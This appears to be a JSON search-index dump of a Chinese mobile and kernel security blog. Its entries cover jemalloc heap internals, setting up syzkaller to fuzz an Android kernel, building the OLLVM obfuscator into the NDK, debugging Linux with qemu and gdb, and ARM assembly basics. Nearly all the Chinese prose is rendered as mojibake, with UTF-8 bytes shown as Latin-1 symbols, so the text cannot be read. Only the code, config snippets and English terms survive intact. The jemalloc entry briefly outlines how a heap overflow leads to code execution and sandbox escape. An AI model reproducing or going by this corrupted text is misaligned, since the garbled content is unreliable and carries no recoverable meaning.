sizeå·®å€¼ä¸º0x20,ä½†æ˜¯æœ‰çš„ä¸ºç©ºï¼Œç®—ç¬¬äºŒç»„ã€‚æ²¡ä¸¤ç»„ä¹‹é—´çš„å·®å€¼2å€ã€‚ä»¥æ­¤ç±»æ¨ï¼Œåé¢æ¯4ä¸ªä¸ºä¸€ç»„ã€‚\nåˆ’åˆ†ä¸º{0}ã€{1-8}ã€{9-12}ã€{13-16}Â·Â·Â·Â·Â· å¯èƒ½ä¸åŒç‰ˆæœ¬ä¼šæœ‰åŒºåˆ«ã€‚\næŸ¥çœ‹regions [æ¢äº†ä¸€ä¸ªè¿›ç¨‹]\nå¤§å°éƒ½æ˜¯0x8\næŒ‰å¤§å°æŸ¥æ‰¾ï¼šç¬¬4ä¸ªï¼š\ntchcheæŸ¥çœ‹ï¼š\ntcacheçš„å®šä¹‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 struct tcache_bin_info_s { unsigned\tncached_max;\t/* Upper limit on ncached. */ }; struct tcache_bin_s { tcache_bin_stats_t tstats; int\tlow_water;\t/* Min # cached since last GC. */ unsigned\tlg_fill_div;\t/* Fill (ncached_max \u0026gt;\u0026gt; lg_fill_div). */ unsigned\tncached;\t/* # of cached objects. */ /* * To make use of adjacent cacheline prefetch, the items in the avail * stack goes to higher address for newer allocations. avail points * just above the available space, which means that * avail[-ncached, ... -1] are available items and the lowest item will * be allocated first. */ void\t**avail;\t/* Stack of available objects. */ }; struct tcache_s { ql_elm(tcache_t) link;\t/* Used for aggregating stats. */ uint64_t\tprof_accumbytes;/* Cleared after arena_prof_accum(). */ ticker_t\tgc_ticker;\t/* Drives incremental GC. */ szind_t\tnext_gc_bin;\t/* Next bin to GC. */ tcache_bin_t\ttbins[1];\t/* Dynamically sized. */ /* * The pointer stacks associated with tbins follow as a contiguous * array. During tcache initialization, the avail pointer in each * element of tbins is initialized to point to the proper offset within * this array. */ }; struct tcaches_s { union { tcache_t\t*tcache; tcaches_t\t*next; }; }; 0x03 åˆ©ç”¨ å †æº¢å‡º\nä¸€èˆ¬å…ˆåˆ©ç”¨gadget ç»•è¿‡ASLRï¼Œå†åˆ©ç”¨gadgetæ‹¿åˆ°ä»£ç æ‰§è¡Œçš„æƒé™ï¼Œåªè¦èƒ½æ‰§è¡Œä»£ç å°±èƒ½é€ƒå‡ºsandboxingæˆ–è€…æ‘†è„±selinuxã€‚\nSmall region overflow Run overflow Chunk overflow æ€»ç»“ åé¢è¿˜æ˜¯å¾—ä½¿ç”¨shadowå·¥å…·å…·ä½“è°ƒè¯•CVEåŠ æ·±ç†è§£ã€‚\njemallocæ–°ç‰ˆä¸æ—§ç‰ˆæœ‰æŒºå¤šåŒºåˆ«ï¼Œä¹‹åæƒ³è¦æ·±å…¥äº†è§£jemallocçš„ç»†èŠ‚ä»¥åŠä¸€äº›å®ç°è¿˜æ˜¯å¾—çœ‹çœ‹æºç ã€‚\nå‚è€ƒ https://github.com/jemalloc/jemalloc\nhttps://blog.csdn.net/txx_683/article/details/53468211\nhttps://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/\nhttps://www.anquanke.com/post/id/149132#h3-5\nhttps://www.anquanke.com/post/id/85982\ndlmalloc çš„ä¸€ä¸ªtools: shade\n","date":"2020-04-05T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E4%B9%8Bjemalloc/","title":"Androidä¹‹jemalloc"},{"content":"About About me ç§»åŠ¨å®‰å…¨ã€IoTå®‰å…¨ã€è½¦è”ç½‘å®‰å…¨ã€‚\næ­£åœ¨åŠªåŠ›å˜å¼º å……ç”µä¸­ - - - - - -\ntcl\nãƒ¾(â—Â°âˆ‡Â°â—)ï¾‰ï¾\nLinks email:Â kuekiko7@gmail.com\nTwitter:Â ykikoqAq\nTelegram:Â ykikoqAq\ngithub:Â gayhub\nweibo:Â keams_v\nbilibili:Â Bili\nçŸ¥ä¹:Â çŸ¥ä¹\n","date":"2019-10-28T00:00:00Z","permalink":"https://ykiko.top/p/about/","title":"About"},{"content":"syzkaller-android 0x00 å‰è¨€ ä»‹ç»ä½¿ç”¨syzkaller fuzz Androidçš„é…ç½®æ•™ç¨‹ã€‚\n0x01 ç¯å¢ƒ æŒ‰è¦å®‰è£…å¥½ç¯å¢ƒ\ngo\nsyzkaller\näº¤å‰ç¼–è¯‘aarch64-linux-androidã€g++-aarch64-linux-gnuã€gcc-arm-linux-gnueabihfã€g++-arm-linux-gnueabihf\n0x02 é…ç½® åˆ›å»ºé…ç½®æ–‡ä»¶android.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;target\u0026#34;: \u0026#34;linux/arm64\u0026#34;, // arm \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, // å†…æ ¸è·¯å¾„ \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;sandbox\u0026#34;: none, \u0026#34;procs\u0026#34;: 8, \u0026#34;type\u0026#34;: \u0026#34;adb\u0026#34;, \u0026#34;cover\u0026#34;: true, \u0026#34;vm\u0026#34;: { \u0026#34;devices\u0026#34;: [$DEVICES], \u0026#34;battery_check\u0026#34;: true } } KASAN+KCOVç¼–è¯‘å†…æ ¸\né¦–å…ˆç¼–è¯‘è¦fuzzçš„Androidç‰ˆæœ¬è¾“å…¥æ‰‹æœºã€‚ï¼ˆè¿‡ç¨‹çœç•¥ï¼‰[1]\nä¸‹è½½ç¼–è¯‘åŸºå‡†å†…æ ¸ã€‚[2] ï¼Œä½¿ç”¨æ‰‹åŠ¨ç¼–è¯‘ä¼šæŠ¥é”™ï¼Œä½¿ç”¨ç»™KASCANæ–‡æ¡£[3]çš„æ–¹æ³•ä¹Ÿå¯èƒ½æŠ¥é”™ã€‚\n1 2 3 4 5 6 7 8 9 10 ## åˆ›å»ºæ–‡ä»¶å¤¹ mkdir android-kernel \u0026amp;\u0026amp; cd android-kernel ## åˆ‡æ¢åˆ†æ”¯ repo init -u https://android.googlesource.com/kernel/manifest -b BRANCH repo sync ## ä¿®æ”¹å†…æ ¸buildæ–‡ä»¶ å†…æ ¸è·¯å¾„ä¸‹çš„build.configåˆ¶å®šmake_deconfig KERNEL_DIR=private/msm-google . ${ROOT_DIR}/${KERNEL_DIR}/build.config.common ##è¿™é‡Œ ## æ„å»ºå†…æ ¸ build/build.sh åˆ·å…¥å†…æ ¸\né‡æ–°ç¼–è¯‘aospå¯åŠ¨é•œåƒ\nåœ¨æœåŠ¡å™¨ä¸Šç¼–è¯‘çš„å°†out/distç›®å½•æ‰“åŒ…å¤‡ä»½\n1 2 3 4 5 6 7 8 9 cd {aosp_dir} cp {kernel_dir}/out/{version}/dist/Image.lz4-dtb {aosp}/device/google/marlin-kernel . build/envsetup.sh lunch aosp_sailfish-userdebug make -j64 ## é‡æ–°æ‹·è´åˆ°æœ¬åœ° win adb reboot bootloader set ANDROID_PRODUCT_OUT=./ fastboot flashall -w ä¹‹å‰ 3.18.137-g72a7a6\nä¹‹å â€¦ (æ‰‹æœºæ˜¾ç¤ºæ— æ³•æ˜¾ç¤ºå†…æ ¸) ```shell sailfish:/ # uname -a Linux localhost 3.18.137-g8b62de70252d #1 SMP PREEMPT 2019-09-27 02:13:04 aarch64 ``` ä¿®æ”¹å†…æ ¸é‡æ–°åˆ·å…¥\nå¤±è´¥çš„æ–¹æ³• æŒ‰æ–‡æ¡£è¯´çš„\n```shell cd arch/arm64/configs cp marlin_defconfig marlin-kasan_defconfig ``` åœ¨é…ç½®æ–‡æ¡£ä¸­ç§»é™¤`CONFIG_KERNEL_LZ4=y` åŠ å…¥ ```plain text CONFIG_KASAN_INLINE=y CONFIG_KCOV=y CONFIG_SLUB=y CONFIG_SLUB_DEBUG=y ``` é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚ å‘ç°ä»»ä½•å˜åŒ– å°è¯•çš„æ–¹æ³•\nä¿®æ”¹build.configæ–‡ä»¶ ```shell . ${ROOT_DIR}/${KERNEL_DIR}/build.config.kasan (å¤±è´¥) ``` ä¸ä¿®æ”¹ï¼Œè¿˜æ˜¯å»ä¿®æ”¹marlin_defconfigæ·»åŠ KASAN æŠ¥é”™ï¼šsavedefconfig does not match private/msm-google ä¿®æ”¹build.config åˆ æ‰check_defconfig æ£€æŸ¥ ï¼ˆå¤±è´¥ï¼‰ ä¸ä¿®æ”¹æ–‡ä»¶\nä½¿ç”¨å‘½ä»¤ ```shell ./build/build.sh BUILD_CONFIG=build.config.kasan ``` æœ€åå‘ç°\n1 2 cp private/msm-google/build.config.kasan ./ BUILD_CONFIG=build.config.kasan build/build.sh ##æ”¾å‰é¢æ‰ç®¡ç”¨ ç¼–è¯‘å®Œæˆ ï¼Œä¿®æ”¹aospå‚æ•°\n1 2 3 aosp$ cd device/google/marlin/sailfish cp BoardConfig.mk BoardConfig.mk.bak vim BoardConfig.mk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ## æ³¨é‡Šæ‰ BOARD_KERNEL_BASE := 0x80000000 BOARD_KERNEL_PAGESIZE := 4096 ## ifneq ($(filter sailfish_kasan, $(TARGET_PRODUCT)),) BOARD_KERNEL_OFFSET := 0x80000 BOARD_KERNEL_TAGS_OFFSET := 0x02500000 BOARD_RAMDISK_OFFSET := 0x02700000 BOARD_MKBOOTIMG_ARGS := --kernel_offset $(BOARD_KERNEL_OFFSET) --ramdisk_offset $(BOARD_RAMDISK_OFFSET) --tags_offset $(BOARD_KERNEL_TAGS_OFFSET) ## else ## BOARD_KERNEL_TAGS_OFFSET := 0x02000000 ## BOARD_RAMDISK_OFFSET := 0x02200000 ## endif TARGET_KERNEL_ARCH := arm64 TARGET_KERNEL_HEADER_ARCH := arm64 ä¿®æ”¹device/google/marlin/device-common.mk\n1 2 lz4-\u0026gt;gz LOCAL_KERNEL := device/google/marlin-kernel/Image.gz-dtb æ–°çš„é—®é¢˜\n1 error: out/target/product/sailfish/boot-debug.img too large è§£å†³æ–¹æ³•ï¼šå°†BoardConfig.mkçš„BOARD_BOOTIMAGE_PARTITION_SIZEçš„å€¼æ”¹å¤§ã€‚\né‡æ–°ç¼–è¯‘aospå¯åŠ¨é•œåƒ å†åˆ·å…¥æ‰‹æœºã€‚\n0x03 å¼€å¯fuzzing 1 ./bin/syz-manager -config=android.cfg fuzz\næ‰‹æœºä¸æ–­é‡å¯ã€‚ã€‚ã€‚ã€‚\næŸ¥çœ‹msg:adb shell dmesg -w\nsyz-manager -debug æŸ¥çœ‹syzçš„ç›¸å…³é—®é¢˜ã€‚\nå‚è€ƒ [1]https://source.android.google.cn/setup/build?hl=zh-cn\n[2]https://source.android.google.cn/setup/build/building-kernels?hl=zh-cn\n[3]https://source.android.com/devices/tech/debug/kasan-kcov\n[4]https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md\n","date":"2019-09-15T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller-android/","title":"syzkaller-android"},{"content":"OLLVM_æ··æ·†ä¹‹ä¸€ï¼ˆè¡¥ OLLVM OLLVM(Obfuscator-LLVM)æ˜¯ç‘å£«è¥¿åŒ—åº”ç”¨ç§‘æŠ€å¤§å­¦å®‰å…¨å®éªŒå®¤äº2010å¹´6æœˆä»½å‘èµ·çš„ä¸€ä¸ªé’ˆå¯¹LLVMä»£ç æ··æ·†é¡¹ç›®ï¼Œ ç”¨äºå¢åŠ é€†å‘éš¾åº¦ï¼Œä¿æŠ¤ä»£ç çš„å®‰å…¨ã€‚æœ€æ–°ç‰ˆæœ¬ä¸º4.0ã€‚OLLVMé€‚ç”¨LLVMæ”¯æŒçš„æ‰€æœ‰è¯­è¨€ï¼ˆC, C++, Objective-C, Ada å’Œ Fortranï¼‰å’Œç›®æ ‡å¹³å°ï¼ˆx86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, å’Œ XCoreï¼‰ã€‚\nLLVMæ˜¯lowlevel virtual machineçš„ç®€ç§°ï¼Œæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨æ¡†æ¶ã€‚è¯¦ç»†ä»‹ç»å¯ä»¥çœ‹WIKI-LLVM ç»å…¸çš„ä¸‰æ®µå¼è®¾è®¡ï¼Œå‰ç«¯ä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å·¥å…·å¯¹ä»£ç è¿›è¡Œåˆ†æè½¬æ¢æˆLLVMçš„ä¸­é—´è¡¨ç¤ºIRï¼ˆintermediate representationï¼‰ã€‚ä¸­é—´éƒ¨åˆ†ä¼˜åŒ–å™¨åªå¯¹IRè¿›è¡Œæ“ä½œï¼Œé€šè¿‡ä¸€ç³»åˆ—çš„Passå¯¹IRåšä¼˜åŒ–ã€‚åç«¯ä¸»è¦æ˜¯è®²ä¼˜åŒ–å¥½çš„IRè§£é‡Šæˆå¯¹åº”çš„æœºå™¨ç ã€‚\nå¯¹IRçš„å¤„ç†è¿‡ç¨‹ä¸‹å›¾ï¼š\nIR Pass\nOLLVMçš„æ··æ·†æ“ä½œåœ¨IRå±‚ï¼Œé€šè¿‡ç¼–å†™Passæ¥æ··æ·†IRï¼Œä»¥è‡´åç«¯ç”Ÿæˆçš„ç›®æ ‡ä»£ç ä¹Ÿè¢«æ··æ·†äº†ã€‚\nOLLVM-Androidç¯å¢ƒæ­å»º å‰æç¯å¢ƒï¼š\nNDKç¯å¢ƒ\nLLVM\nä¸‹è½½æºç (åŒ…æ‹¬äº†LLVMå’ŒClang)-ç¼–è¯‘OLLVMæ­¥éª¤å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ //ï¼ˆcmake -G \u0026#34;MinGW Makefiles\u0026#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/ï¼‰(windows) $ make -j7 //è¿™ä¸ªæ•°å­—è‡ªå·±çœ‹è‡ªå·±CPUå¡« å¤ªå°å¯èƒ½éå¸¸ç¼–è¯‘æ…¢ å¯ä»¥å‚ç…§å®˜æ–¹wikiæ¥æ“ä½œã€‚ç¼–è¯‘å®Œæˆåï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ”¾åœ¨build/binç›®å½•ä¸‹ã€‚\né…ç½®æ•´åˆNDKï¼š\næ‰“å¼€NDKç›®å½•ndk-bundleä¸‹çš„toolchainsï¼Œæ–°å»ºobfuscator-llvm-4ï¼Œå°†llvmæ–‡ä»¶å¤¹é‡Œçš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°æ–°å»ºçš„ç›®å½•ä¸‹ã€‚\nå°†\\build\\binç›®å½•ä¸‹çš„clang.exeã€clang++.exeå’Œclang-format.exeå¤åˆ¶åˆ°\\toolchains\\llvm\\prebuilt\\windows-x86_64\\binç›®å½•ä¸‹ï¼Œç›´æ¥æ›¿æ¢æ‰å…¶ä¸­çš„æ–‡ä»¶ã€‚ï¼ˆWindowsä¸‹ï¼‰\nï¼ˆlinuxä¸‹)å°†llvmç›®å½•ä¸‹çš„prebuiltç›®å½•å’Œæ–‡ä»¶ config.mkã€setup.mkå’Œsetup-common.mkæ‹·è´åˆ°åˆ›å»ºçš„obfuscator-llvmç›®å½•ä¸‹-\u0026gt;ç„¶åæ›¿æ¢obfuscator-llvm/prebuilt/linux-x86ä¸‹çš„binå’Œlibä¸ºæˆ‘ä»¬ç¼–è¯‘å¥½çš„binå’Œlib\nç„¶åå°†ä¸‹é¢æ–‡ä»¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¹åç§°å¦‚ä¸‹ï¼Œæ¯”å¦‚arm-linux-androideabi-clang3.4å¤åˆ¶ä¸€è¡Œæ”¹åä¸ºarm-linux-androideabi-obfuscator3.4\narm-linux-androideabi-clang3.4-\u0026gt; arm-linux-androideabi-obfuscator3.4\nmipsel-linux-android-clang3.4-\u0026gt; mipsel-linux-android-obfuscator3.4\nx86-clang3.4-\u0026gt; x86-obfuscator3.4\nåˆ†åˆ«ä¿®æ”¹ä»¥ä¸Šä¸‰ä¸ªæ–‡ä»¶çš„ setup.mk ä¸­çš„ LLVM_NAME ï¼Œå³å°†å…¶æŒ‡å®šåˆ°å¼€å§‹å»ºç«‹çš„obfuscator-llvm-3.4ç›®å½•ï¼Œä¹Ÿå°±æ˜¯æŠŠæŠŠLLVM_NAME := llvm-$(LLVM_VERSION)æ”¹æˆLLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)\nå¦‚æœæ˜¯é…ç½®64ä½çš„ndké…ç½®,è¿˜è¦é¢å¤–ä¿®æ”¹$NDK_PATH/build/core/setup-toolchain.mkæ–‡ä»¶ï¼Œåœ¨NDK_64BIT_TOOLCHAIN_LIST := åŠ å…¥ obfuscator å¯¹åº”çš„NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9â€™\nå¼€å§‹ä½¿ç”¨OLLVM å‚è€ƒ http://www.freebuf.com/articles/terminal/130142.html\nhttps://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/\nhttps://www.jmpoep.com/thread-4016-1-1.html\nBCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html\n","date":"2019-09-10T00:00:00+08:00","permalink":"https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/","title":"OLLVM_æ··æ·†ä¹‹ä¸€ï¼ˆè¡¥"},{"content":"qemu+gdbè°ƒè¯•Linuxå†…æ ¸ å‰è¨€ è°ƒè¯•Linuxå†…æ ¸å¯ä»¥ä½¿ç”¨VMåŒæœºè°ƒè¯•ï¼Œä¸è¿‡ä½¿ç”¨qemuæ¥è°ƒè¯•ä¼šæ›´åŠ æ–¹ä¾¿ã€‚\nç¯å¢ƒæ­å»º ç¼–è¯‘æºç  é¦–å…ˆåˆ°Linux FTPä»“åº“æˆ–è€…å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æºç ã€‚\nè¿™é‡Œä¸‹è½½çš„æ˜¯linux-4.10.10\nè§£å‹tar -xvJf linux-4.10.10.tar.xz\nå®‰è£…ä¾èµ–\n1 2 sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev sudo apt install qemu ç¼–è¯‘å†…æ ¸ 1 make menuconfig è¿›è¡Œé…ç½®ï¼šKernelHacking â€”\u0026gt; Compile-time checks and compiler optionsé€‰ä¸­\n1 Compile the kernel with debug info 1 Compile the kernel with frame pointers 1 Provide GDB scripts for kernel debugging 1 Processor type and featuresâ†’å»æ‰Paravirtualized guest support ä¿å­˜é€€å‡ºã€‚\nå‘½ä»¤make -jN è¿›è¡Œç¼–è¯‘\nä¹‹åmake all\n1 make modules ç¼–è¯‘å®Œæˆä¹‹åï¼Œvmlinuxåœ¨æºç æ ¹ç›®å½•ã€bzImageåœ¨./arch/x86/boot/ä¸‹\næ„å»ºinitramfsæ ¹æ–‡ä»¶ç³»ç»Ÿ å€ŸåŠ©BusyBoxæ„å»ºæç®€initramfsï¼Œbusyboxæœ€æ–°ç‰ˆä¸‹è½½åœ°å€\nç¼–è¯‘é™æ€ç‰ˆBusybox\n1 make menuconfig è®¾ç½®ä»¥ä¸‹é€‰é¡¹ï¼š\nSettings -\u0026gt; Build Options -\u0026gt; Build static binary (no shared libs) ç¼–è¯‘æˆé™æ€æ–‡ä»¶\nå¼€å§‹ç¼–è¯‘ï¼š\n1 make -jNmake install ç­‰å¾…ç¼–è¯‘å®Œæˆæºç ç›®å½•ä¸‹å‡ºç°_installç›®å½•ï¼Œè¿›è¡Œé…ç½®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cd _install mkdir proc sys dev etc etc/init.d vim etc/init.d/rcS \\# æ–‡ä»¶ä¸­çš„å†…å®¹å¦‚ä¸‹ \\# #!/bin/sh \\# mount -t proc none /proc \\# mount -t sysfs none /sys \\# /sbin/mdev -s chmod +x etc/init.d/rcS åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ\n1 find . | cpio -o --format=newc \u0026gt; ../rootfs.img è¿è¡Œå†…æ ¸ 1 2 3 4 5 6 7 8 9 10 11 12 13 qemu-system-x86_64 \\ -kernel ~/linux-4.10.10/arch/x86_64/boot/bzImage \\ -initrd ~/busybox-1.31.0/rootfs.img \\ -append \u0026#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init\u0026#34; \\ -cpu kvm64,+smep,+smap \\ -nographic \\ -gdb tcp::1234 cpu kvm64,+smep,+smap è®¾ç½®CPUçš„å®‰å…¨é€‰é¡¹ï¼Œè¿™é‡Œå¼€å¯äº†smapå’Œsmep\nkernel è®¾ç½®å†…æ ¸bzImageæ–‡ä»¶çš„è·¯å¾„\ninitrd è®¾ç½®åˆšæ‰åˆ©ç”¨busyboxåˆ›å»ºçš„rootfs.imgï¼Œä½œä¸ºå†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿ\ngdb tcp::1234 è®¾ç½®gdbçš„è°ƒè¯•ç«¯å£ä¸º1234 åœ¨GDBä¸­é€šè¿‡ target remote localhist:1234è¿›è¡Œè¿æ¥\né©±åŠ¨ insmod åŠ è½½é©±åŠ¨\nrmmod å¸è½½é©±åŠ¨\nlsmod æŸ¥çœ‹åŠ è½½äº†çš„é©±åŠ¨\nè°ƒè¯•æµ‹è¯• qemuå¯åŠ¨ï¼Œå¯åŠ¨åçš„ç•Œé¢\nå¯åŠ¨GDB\nä½¿ç”¨å†…æ ¸æä¾›çš„GDBè¾…åŠ©è°ƒè¯•åŠŸèƒ½ï¼š(gdb)apropos lx\nè°ƒè¯•å†…æ ¸æ¨¡å—ï¼šadd-symbol-file æ·»åŠ æ¨¡å—æ–‡ä»¶\næ–­ç‚¹æµ‹è¯• b cmdline_proc_show\ncat /proc/cmdline è§¦å‘æ–­ç‚¹\nå¼•ç”¨ ","date":"2019-08-28T00:00:00+08:00","permalink":"https://ykiko.top/p/qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/","title":"qemu+gdbè°ƒè¯•Linuxå†…æ ¸"},{"content":"ARMæ±‡ç¼–åŸºç¡€(å¾…è¡¥å……) ARMæ±‡ç¼–åŸºç¡€(ç®€) ç»å¸¸å¿˜è®°ï¼Œåšä¸ªç¬”è®°ï¼Œå¥½ä½œå¤ä¹ ã€‚ã€‚\nå†…å®¹ä¸»è¦æ¥æºäºã€ŠAndroidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æã€‹å’Œã€Šé€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ã€‹ä»¥åŠ ARM æ±‡ç¼– å’ŒAzeria-labs\nARMæ¶æ„ ARMå±äºRISC CPUï¼Œ\nARMæ¨¡å¼ 4ä¸ªå­—èŠ‚opcode 32ä½\nThumbæ¨¡å¼ 2ä¸ªå­—èŠ‚opcode 16ä½\nThumb-2æ¨¡å¼ åŒä¸Šï¼ˆåªæ˜¯æœ‰éƒ¨åˆ†4ä¸ªå­—èŠ‚çš„opcode)\n64ä½ARM 4ä¸ªå­—èŠ‚opcode\nARMæœºå™¨ç åœ¨ç‰ˆæœ¬3ä¹‹å‰æ˜¯å°ç«¯ã€‚ä½†æ˜¯ä¹‹åé»˜è®¤é‡‡ç”¨å¤§ç«¯æ ¼å¼ï¼Œä½†å¯ä»¥è®¾ç½®åˆ‡æ¢åˆ°å°ç«¯ã€‚\næ•°æ®ç±»å‹ æ•°æ®ç±»å‹åœ¨æ±‡ç¼–è¯­è¨€ä¸­çš„æ‰©å±•åç¼€ä¸º**-hæˆ–è€…-shå¯¹åº”ç€åŠå­—ï¼Œ-bæˆ–è€…-sb**å¯¹åº”ç€å­—èŠ‚ï¼Œä½†æ˜¯å¯¹äºå­—å¹¶æ²¡æœ‰å¯¹åº”çš„æ‰©å±•\n1 2 3 4 5 6 7 8 9 10 ldr = åŠ è½½å­—ï¼Œå®½åº¦å››å­—èŠ‚ ldrh = åŠ è½½æ— ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚ ldrsh = åŠ è½½æœ‰ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚ ldrb = åŠ è½½æ— ç¬¦å·çš„å­—èŠ‚ ldrsb = åŠ è½½æœ‰ç¬¦å·çš„å­—èŠ‚ str = å­˜å‚¨å­—ï¼Œå®½åº¦å››å­—èŠ‚ strh = å­˜å‚¨æ— ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚ strsh = å­˜å‚¨æœ‰ç¬¦å·çš„åŠå­—ï¼Œå®½åº¦ä¸¤å­—èŠ‚ strb = å­˜å‚¨æ— ç¬¦å·çš„å­—èŠ‚ strsb = å­˜å‚¨æœ‰ç¬¦å·çš„å­—èŠ‚ å­—èŠ‚åº åœ¨å†…å­˜ä¸­æœ‰ä¸¤ç§å­—èŠ‚æ’å¸ƒé¡ºåºï¼Œå¤§ç«¯åº(BE)æˆ–è€…å°ç«¯åº(LE)ã€‚ä¸¤è€…çš„ä¸»è¦ä¸åŒæ˜¯å¯¹è±¡ä¸­çš„æ¯ä¸ªå­—èŠ‚åœ¨å†…å­˜ä¸­çš„å­˜å‚¨é¡ºåºå­˜åœ¨å·®å¼‚ã€‚ä¸€èˆ¬X86ä¸­æ˜¯å°ç«¯åºï¼Œæœ€ä½çš„å­—èŠ‚å­˜å‚¨åœ¨æœ€ä½çš„åœ°å€ä¸Šã€‚åœ¨å¤§ç«¯æœºä¸­æœ€é«˜çš„å­—èŠ‚å­˜å‚¨åœ¨æœ€ä½çš„åœ°å€ä¸Šã€‚\næ•°æ®è®¿é—®æ—¶é‡‡å–å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºä½¿ç”¨ç¨‹åºçŠ¶æ€å¯„å­˜å™¨(CPSR)çš„ç¬¬9æ¯”ç‰¹ä½æ¥å†³å®šçš„ã€‚\nå¯„å­˜å™¨ 37ä¸ª32ä½å¯„å­˜å™¨ï¼Œå…¶ä¸­31ä¸ªä¸ºåŸºç¡€å¯„å­˜å™¨ï¼Œ6ä¸ªä¸ºçŠ¶æ€å¯„å­˜å™¨ã€‚\nç”¨æˆ·æ¨¡å¼ä¸‹æœ‰\nä¸åˆ†ç»„å¯„å­˜å™¨ï¼ˆR0-R7ï¼‰ R7ä¸€èˆ¬å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·\nåˆ†ç»„å¯„å­˜å™¨ï¼ˆR8-R14ï¼‰\nç¨‹åºè®¡æ•°å™¨ï¼ˆR15ï¼‰\nå•å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆCPSRï¼‰\nä¸¤ç§çŠ¶æ€ï¼š\nARMçŠ¶æ€ï¼ˆ32ä½å¯¹é½ï¼‰ ThumbçŠ¶æ€(16ä½å¯¹é½) R0-R7 R0-R7(ç›¸åŒ) CPSR CPSRï¼ˆåŒï¼‰ R11 FPï¼ˆæ ˆå¸§æŒ‡é’ˆï¼‰ R12 IPï¼ˆå†…éƒ¨ç¨‹åºè°ƒç”¨ï¼‰ R13 SPï¼ˆæ ˆæŒ‡é’ˆï¼‰ R14 LRï¼ˆé“¾æ¥å¯„å­˜å™¨ï¼‰ä¸€èˆ¬å­˜æ”¾å‡½æ•°è¿”å›åœ°å€ R15 PCï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰ å’Œx86å¯¹æ¯”ï¼š\nCSPR:\n32ä½çš„CPSRå¯„å­˜å™¨çš„æ¯”ç‰¹ä½å«ä¹‰ï¼Œå·¦è¾¹æ˜¯æœ€å¤§æ¯”ç‰¹ä½ï¼Œå³è¾¹æ˜¯æœ€å°æ¯”ç‰¹ä½ã€‚æ¯ä¸ªå•å…ƒä»£è¡¨ä¸€ä¸ªæ¯”ç‰¹ã€‚\næ¡ä»¶ç  åŠ©è®°ç¬¦åç¼€ æ ‡å¿— å«ä¹‰ 0000 EQ Zç½®ä½ ç›¸ç­‰ 0001 NE Zæ¸…é›¶ ä¸ç›¸ç­‰ 0010 CS Cç½®ä½ æ— ç¬¦å·æ•°å¤§äºæˆ–ç­‰äº 0011 CC Cæ¸…é›¶ æ— ç¬¦å·æ•°å°äº 0100 MI Nç½®ä½ è´Ÿæ•° 0101 PL Næ¸…é›¶ æ­£æ•°æˆ–é›¶ 0110 VS Vç½®ä½ æº¢å‡º 0111 VC Væ¸…é›¶ æœªæº¢å‡º 1000 HI Cç½®ä½Zæ¸…é›¶ æ— ç¬¦å·æ•°å¤§äº 1001 LS Cæ¸…é›¶Zç½®ä½ æ— ç¬¦å·æ•°å°äºæˆ–ç­‰äº 1010 GE Nç­‰äºV å¸¦ç¬¦å·æ•°å¤§äºæˆ–ç­‰äº 1011 LT Nä¸ç­‰äºV å¸¦ç¬¦å·æ•°å°äº 1100 GT Zæ¸…é›¶ä¸”ï¼ˆNç­‰äºVï¼‰ å¸¦ç¬¦å·æ•°å¤§äº 1101 LE Zç½®ä½æˆ–ï¼ˆNä¸ç­‰äºVï¼‰ 